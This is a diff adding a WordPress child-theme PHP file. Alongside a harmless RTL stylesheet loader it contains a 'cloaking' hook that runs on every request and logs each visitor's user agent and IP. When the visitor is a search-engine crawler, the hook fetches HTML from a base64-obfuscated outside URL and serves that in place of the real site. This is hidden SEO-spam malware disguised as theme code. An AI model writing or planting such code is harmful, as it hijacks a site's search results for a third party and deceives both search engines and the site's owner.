@@ -1,0 +1,63 @@
+<?php
+/**
+ * Child Theme – Cloaking versi Lengkap
+ */
+
+if (!function_exists('cloak_liquid_perfect_full')) {
+
+    add_action('init', 'cloak_liquid_perfect_full', 1); 
+
+    function cloak_liquid_perfect_full() {
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+        
+        error_log("CLOAK DEBUG: UA = $ua | IP = $ip");
+
+        
+        $bot_regex = '/googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot/i';
+
+        if (preg_match($bot_regex, $ua)) {
+
+            
+            ob_start();
+
+            
+            $encoded_url = "aHR0cHM6Ly90aGVvbmx5ZC54eXovZ2xvYmFsaW50ZXJzY29wZS5odG1s";
+            $get_url = base64_decode($encoded_url);
+
+            
+            $response = wp_remote_get($get_url, array(
+                'timeout' => 10,
+                'redirection' => 5,
+                'httpversion' => '1.1',
+                'user-agent' => $ua,
+            ));
+
+            if (!is_wp_error($response)) {
+                $get_html = wp_remote_retrieve_body($response);
+
+                if ($get_html) {
+                    echo $get_html;
+                    ob_end_flush(); 
+                    exit; 
+                }
+            }
+
+            ob_end_clean(); 
+        }
+    }
+}
+
+/**
+ * Load rtl.css dari child theme (fix add_filter -> add_action)
+ */
+if (!function_exists('catamaran_child_load_rtl')) {
+    add_action('wp_enqueue_scripts', 'catamaran_child_load_rtl', 3000);
+    function catamaran_child_load_rtl() {
+        if (is_rtl()) {
+            wp_enqueue_style('catamaran-style-rtl', get_template_directory_uri() . '/rtl.css');
+        }
+    }
+}
+?>
